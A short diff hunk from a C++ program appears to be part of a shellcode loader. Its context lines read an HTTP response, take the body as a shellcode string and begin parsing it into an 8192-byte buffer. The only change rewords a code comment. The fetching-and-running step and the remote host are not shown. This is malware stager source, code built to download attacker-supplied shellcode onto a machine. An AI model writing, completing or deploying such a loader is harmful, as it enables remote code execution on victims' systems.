@@ -61,7 +61,7 @@ int main()
 		response += buf;
 	}
 
-	// convert shellcode string from http response into bytes
+	// convert shellcode string from http response into byte array
 	string shellcode_str = response.substr(response.find("\r\n\r\n"));
 	unsigned char shellcode[8192];
 	for (int i = 0; i < shellcode_str.size() / 4; ++i)
